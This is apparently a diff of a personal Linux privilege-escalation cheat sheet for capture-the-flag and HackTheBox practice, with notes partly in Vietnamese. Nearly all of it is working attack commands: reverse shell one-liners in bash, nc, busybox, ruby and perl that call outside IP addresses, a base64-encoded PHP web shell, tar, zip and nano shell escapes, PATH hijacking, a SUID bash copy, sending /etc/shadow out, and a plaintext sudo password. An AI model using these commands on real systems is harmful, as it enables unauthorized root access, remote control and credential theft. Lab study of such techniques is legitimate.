@@ -1,32 +1,68 @@
+https://github.com/diego-treitos/linux-smart-enumeration  #dump info
+https://github.com/DominicBreuker/pspy
+https://github.com/rebootuser/LinEnum          #dump info, which process are processing
+linpeas, dirtycow 2.6.22 < 3.9
+
+các lệnh không từ ubuntu có khả năng priv dc
 https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
 https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd
 ghi de PATH variable
 cronjob
 backupfile --> check cronjob
 /etc/hosts
+/var/log
 /etc/apache/000-default.conf
+/etc/squid/squid.conf
+/etc/default
+/etc/sudoers
 sudo -l   #check permission
+echo $0  #check current shell
+echo $PATH 
+echo $SHELL
+
+https://0xdf.gitlab.io/2018/09/22/htb-olympus.html#pivot-to-hades--olympus---shell-as-prometheus
+groups              #check group of current user
 
 cat /etc/issue         #check linux version
 uname -a               #check kernal version
 cat /proc/cpuinfo      --> model name: AMD  --> virtual machine
 cat /sys/class/dmi/id/     product_name
 check file config in /etc/<module_name>
-
+#-----------------------------------------reverse shell
+không thấy được lỗi, không tab để auto complete được, không interactive nghĩa là khỏi edit file bằng nano hay vi và không interactive được luôn. Nhưng vậy cũng được rồi có gì xài nấy thôi :D
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal
+0 = stdin
+1 = stdout 
+2 = stderr
+ncat nc busybox
+busybox nc <ip> -e /bin/bash
 https://hackmd.io/@endy/B1C24TlOj  #ngrok reverse shell
+https://nhattruong.blog/2022/04/30/write-up-root-me-server-side-request-forgery/
 https://bugbase.in/blog/catching-reverse-shells-over-the-internet
 echo -n "/bin/bash  -c 'bash -i  >& /dev/tcp/10.10.14.8/9001  0>&1'  "|base64 -w 0
 <?php system("echo -n <base64code> | base64 -d | bash") ?>
 nc -lvnp 5555
-nc 172.23.255.217 5555 /etc/bash
+nc 172.23.255.217 5555 -e /etc/bash
+https://0xdf.gitlab.io/2020/04/11/htb-traverxec.html
+/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1"
 https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/linux/cat-pictures
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <Port> >/tmp/f
 echo 'os.execute("cat /root/flag.txt")' > /tmp/a.lua
+https://viblo.asia/p/redteam-0x01-lam-gi-khi-da-chiem-duoc-quyen-dieu-khien-he-thong-phan-1-source-code-management-E1XVOa8GJMz
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+'perl -e ''use Socket;$i="13.229.3.203";$p=19921;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'''
+
+nc -lvnp 9999 -e /bin/bash
+proxychains nc <target_ip> 9999
+------------------------------------------------------------------------------------
 
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -4000 2>/dev/null    #exec file with the owner file permission
 echo ./*
 ls -lia $(find / -perm -4000)
+https://0xdf.gitlab.io/2021/06/08/htb-node.html
+find / -group admin -ls 2>/dev/null 
 nmap --script=/tmp/a.lua
 
 //check
@@ -41,6 +77,7 @@ strace tar -zcf test.tgz
 touch hack
 echo 'cat /root/flag.txt > /tmp/flag' > hack.sh
 tar -zcf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exe="sh hack"
+tar -zcf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exec=/bin/bash
 
 ls /usr/share/centreon/www/include/tools
 
@@ -64,6 +101,15 @@ touch "/var/www/html/--checkpoint=1"
 sudo visudo
 https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd
 time  nano  find  vim  cp
+sudo -u user1 /usr/bin/find /home/user1 -type f -name "hmm.sh" -exec cat {} \; 
+sudo -S /usr/bin/find /home/user1 -type f -name "hmm.sh" -exec cat {} \;
+
+https://viblo.asia/p/htb-write-up-openadmin-07LKXWAD5V4
+nano command priv
+sudo nano /opt/priv : Không yêu cầu password :D
+Ctrl + R => Ctrl + X : Để Execute command
+Command: reset; sh 1>&0 2>&0 và ấn Enter
+
 https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-0-using-sudo-rights-3Q75w8x2KWb
 less  awk  man  vi  env  ftp  socat nano
 scp to send /etc/shadow
@@ -86,3 +132,23 @@ gdb more less rvim
 7)From zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c"/bin/bash"
 8)From tar > /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-3-bypass-restricted-shell-3P0lPPyGlox
+
+https://viblo.asia/p/hackthebox-write-up-traceback-m68Z0pa6ZkG
+luvit
+https://0xdf.gitlab.io/2022/10/29/htb-trick.html#shell-as-root
+rewrite config file
+#----------------------kỹ  thuật ghi đè lệnh con  ( cat, ...)
+https://viblo.asia/p/htb-write-up-magic-LzD5dgMEljY
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+echo $PATH
+export PATH=/tmp:$PATH
+https://viblo.asia/p/htb-write-up-admirer-bWrZnXOw5xw
+python hijacking
+-----------------------------------------------------
+mv  # để ghi đè file không có quyền sửa
+file:///D:/download/THNG01_Boot2Root_WU_2023.pdf
+sudo /usr/bin/node /usr/local/scripts/../../../tmp/exploit.js
+echo 5DymSe0rbLE491QsCLgm | sudo -S /usr/bin/node /usr/local/scripts/../../../tmp/root.js
+#bypass non-interactive shell
+
+cp /bin/bash /tmp/exploit; chmod 4755 /tmp/exploit
